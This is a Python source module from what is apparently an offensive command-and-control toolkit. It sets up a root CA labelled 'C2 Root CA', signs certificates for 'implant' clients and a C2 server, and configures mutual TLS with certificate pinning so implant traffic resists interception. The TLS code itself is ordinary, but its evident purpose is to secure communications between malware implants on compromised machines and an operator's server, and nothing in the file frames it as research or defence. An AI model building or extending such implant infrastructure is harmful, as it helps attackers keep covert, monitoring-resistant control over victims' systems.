"""mTLS support — mutual TLS with certificate pinning.
Replaces plain HTTP with proper TLS on both client and server sides.
Prevents MITM attacks even if the Fernet key is compromised."""

import os
import ssl
import socket
import tempfile
import subprocess
from typing import Optional


def generate_ca(root_dir: str = ".") -> tuple[str, str]:
    """Generate a self-signed CA certificate and private key.
    Returns (ca_cert_path, ca_key_path)."""
    ca_key = os.path.join(root_dir, "ca.key")
    ca_cert = os.path.join(root_dir, "ca.crt")

    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:4096",
        "-keyout", ca_key,
        "-out", ca_cert,
        "-days", "3650",
        "-nodes",
        "-subj", "/C=US/ST=State/L=City/O=C2/OU=Operations/CN=C2 Root CA",
    ], check=True, capture_output=True)

    print(f"CA certificate: {ca_cert}")
    print(f"CA private key: {ca_key}")
    return ca_cert, ca_key


def generate_implant_cert(
    ca_cert: str,
    ca_key: str,
    hostname: str = "implant",
    output_dir: str = ".",
) -> tuple[str, str]:
    """Generate a certificate for an implant, signed by the CA.
    Returns (cert_path, key_path)."""
    key_path = os.path.join(output_dir, f"{hostname}.key")
    csr_path = os.path.join(output_dir, f"{hostname}.csr")
    cert_path = os.path.join(output_dir, f"{hostname}.crt")

    subprocess.run([
        "openssl", "req", "-newkey", "rsa:2048",
        "-keyout", key_path,
        "-out", csr_path,
        "-nodes",
        "-subj", f"/CN={hostname}",
    ], check=True, capture_output=True)

    subprocess.run([
        "openssl", "x509", "-req",
        "-in", csr_path,
        "-CA", ca_cert,
        "-CAkey", ca_key,
        "-CAcreateserial",
        "-out", cert_path,
        "-days", "365",
    ], check=True, capture_output=True)

    os.remove(csr_path)
    print(f"Implant certificate: {cert_path}")
    print(f"Implant private key: {key_path}")
    return cert_path, key_path


def generate_server_cert(
    ca_cert: str,
    ca_key: str,
    hostname: str,
    output_dir: str = "."
) -> tuple[str, str]:
    """Generate a certificate for the C2 server, signed by the CA."""
    return generate_implant_cert(ca_cert, ca_key, f"{hostname}.server", output_dir)


def create_server_ssl_context(
    server_cert: str,
    server_key: str,
    ca_cert: str,
) -> ssl.SSLContext:
    """Create an SSL context for the C2 server with mTLS."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(server_cert, server_key)
    ctx.load_verify_locations(ca_cert)
    ctx.verify_mode = ssl.CERT_REQUIRED  # Require client certificate (mTLS)
    # Enforce minimum TLS 1.2
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    return ctx


def create_client_ssl_context(
    client_cert: str,
    client_key: str,
    ca_cert: str,
    pinned_cert_fingerprint: Optional[str] = None,
) -> ssl.SSLContext:
    """Create an SSL context for the implant client with mTLS and optional cert pinning.

    Args:
        pinned_cert_fingerprint: SHA-256 fingerprint of the server certificate
            to pin. If set, only accept connections to that exact certificate.
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.load_cert_chain(client_cert, client_key)
    ctx.load_verify_locations(ca_cert)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2

    if pinned_cert_fingerprint:
        # Custom cert pinning via hostname override
        ctx.check_hostname = False  # We do our own verification below
        ctx.verify_mode = ssl.CERT_REQUIRED

        original_wrap = ctx.wrap_socket

        def pinned_wrap_socket(sock, **kwargs):
            wrapped = original_wrap(sock, **kwargs)
            cert = wrapped.getpeercert(binary_form=True)
            import hashlib
            actual_fp = hashlib.sha256(cert).hexdigest()
            if actual_fp != pinned_cert_fingerprint:
                wrapped.close()
                raise ssl.SSLCertVerificationError(
                    f"Certificate pinning failed: expected {pinned_cert_fingerprint}, got {actual_fp}"
                )
            return wrapped

        ctx.wrap_socket = pinned_wrap_socket

    return ctx


def get_cert_fingerprint(cert_path: str) -> str:
    """Get the SHA-256 fingerprint of a certificate (for pinning)."""
    result = subprocess.run(
        ["openssl", "x509", "-in", cert_path, "-noout", "-fingerprint", "-sha256"],
        capture_output=True,
        text=True,
        check=True,
    )
    # Output format: "sha256 Fingerprint=AA:BB:CC:..."
    output = result.stdout.strip()
    fp = output.split("=", 1)[1] if "=" in output else output
    return fp.replace(":", "").lower()


def setup_certs(
    ca_dir: str = ".",
    server_hostname: str = "c2server",
) -> dict:
    """Convenience: generate a full CA + server cert in one call.
    Returns a dict with all paths needed for the server."""
    ca_cert, ca_key = generate_ca(ca_dir)
    server_cert, server_key = generate_server_cert(ca_cert, ca_key, server_hostname, ca_dir)
    server_fp = get_cert_fingerprint(server_cert)

    return {
        "ca_cert": ca_cert,
        "ca_key": ca_key,
        "server_cert": server_cert,
        "server_key": server_key,
        "server_fingerprint": server_fp,
    }
